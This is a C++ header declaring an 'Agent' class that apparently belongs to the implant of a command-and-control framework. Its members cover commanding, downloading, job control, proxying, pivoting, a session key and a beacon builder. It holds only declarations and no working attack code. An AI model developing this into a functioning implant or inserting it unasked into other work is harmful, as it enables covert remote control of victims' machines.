#pragma once

#include "AgentInfo.h"
#include "AgentConfig.h"
#include "Downloader.h"
#include "JobsController.h"
#include "MemorySaver.h"
#include "Proxyfire.h"
#include "Pivotter.h"
#include "Commander.h"

class Commander;

class Agent
{
public:
	AgentInfo*		info        = NULL;
	AgentConfig*    config		= NULL;
	Commander*      commander	= NULL;
	Downloader*     downloader	= NULL;
	JobsController* jober		= NULL;
	MemorySaver*    memorysaver = NULL;
	Proxyfire*		proxyfire	= NULL;
	Pivotter*       pivotter    = NULL;

	BYTE* SessionKey = NULL;

	Agent();

	void  SetActive(BOOL state);
	BOOL  IsActive();
	BYTE* BuildBeat(ULONG* size);
};
